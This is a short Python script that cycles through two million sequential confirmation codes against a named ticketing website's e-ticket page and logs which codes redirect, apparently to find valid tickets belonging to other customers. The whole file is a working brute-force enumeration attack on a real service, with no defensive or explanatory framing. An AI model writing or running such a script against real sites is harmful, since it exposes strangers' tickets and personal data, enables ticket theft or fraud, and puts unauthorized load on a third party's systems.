import requests

number = 34000000

while (number < 36000000):
    url = 'http://q-tickets.com/t10/eticket.aspx?code=' + str(number)
    r = requests.get(url)

    #f = open('output.txt','w') f.write("%s\n" + 'Confirmation code: ' +
    #str(number) + ' ' + str(r.history)) f.close()

    with open('output.txt', 'a') as the_file:
        the_file.write('Confirmation code: ' + str(number) + ' ' + str(r.history) + '\n')

    number = number + 1